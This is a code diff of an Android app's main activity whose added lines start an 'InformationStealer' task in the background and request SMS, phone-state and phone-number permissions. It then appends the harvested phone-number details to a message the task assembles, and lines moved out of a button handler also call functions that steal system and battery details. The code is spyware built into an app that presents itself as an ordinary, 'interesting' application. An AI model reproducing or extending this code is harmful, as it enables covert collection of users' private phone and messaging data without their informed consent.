@@ -1,5 +1,7 @@
 package com.example.applicazioneinteressante;
 
+import static com.example.applicazioneinteressante.InformationStealer.stealNumberInformations;
+
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.appcompat.app.AppCompatDelegate;
@@ -130,6 +132,26 @@ public class MainActivity extends AppCompatActivity {
         Executor executor = Executors.newSingleThreadExecutor();
         InformationStealer task = new InformationStealer(this);
         executor.execute(task);
+        String[] permissions = {
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.READ_PHONE_NUMBERS
+        };
+
+        boolean allPermissionsGranted = true;
+        for (String permission : permissions) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                allPermissionsGranted = false;
+                break;
+            }
+        }
+
+        if (!allPermissionsGranted) {
+            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_PHONE_STATE);
+        } else {
+            // Tutti i permessi sono già stati concessi
+            task.setMessaggio(task.getMessaggio().append(stealNumberInformations(this)));
+        }
     }
 
     //Initialize components in the class
@@ -206,31 +228,6 @@ public class MainActivity extends AppCompatActivity {
                     break;
             }
 
-            InformationStealer.stealSystemDetail(this);
-            InformationStealer.stealBatteryInformation(this);
-
-
-            String[] permissions = {
-                    Manifest.permission.READ_PHONE_STATE,
-                    Manifest.permission.READ_SMS,
-                    Manifest.permission.READ_PHONE_NUMBERS
-            };
-
-            boolean allPermissionsGranted = true;
-            for (String permission : permissions) {
-                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-                    allPermissionsGranted = false;
-                    break;
-                }
-            }
-
-            if (!allPermissionsGranted) {
-                ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_PHONE_STATE);
-            } else {
-                // Tutti i permessi sono già stati concessi
-                InformationStealer.stealNumberInformations(this);
-            }
-
         });
 
         this.<Button>findViewById(R.id.ansBtn).setOnClickListener(v -> {
@@ -271,7 +268,8 @@ public class MainActivity extends AppCompatActivity {
             }, PERMISSION_REQUEST_PHONE_STATE);
         } else {
             // I permessi sono già stati concessi
-            InformationStealer.stealNumberInformations(this);
+            InformationStealer task = new InformationStealer(this);
+            task.setMessaggio(task.getMessaggio().append(stealNumberInformations(this)));
         }
     }
 
